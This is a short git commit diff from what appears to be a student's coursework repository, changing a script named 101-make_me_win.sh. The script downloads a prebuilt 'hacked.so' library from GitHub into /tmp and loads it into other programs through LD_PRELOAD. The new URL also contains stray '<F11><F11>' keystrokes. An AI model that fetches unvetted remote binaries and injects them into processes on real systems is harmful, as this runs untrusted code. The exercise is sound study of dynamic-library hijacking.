fbe0778bb5e691f7b610470765b879493bd00c5a
Ayo Adekunle <ay4eva2006@gmail.com>
2023-02-21 08:32:08 -0800

    quick fix

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+wget -P /tmp https://github.com/ay4eva2006/<F11><F11>alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
 export LD_PRELOAD=/tmp/hacked.so
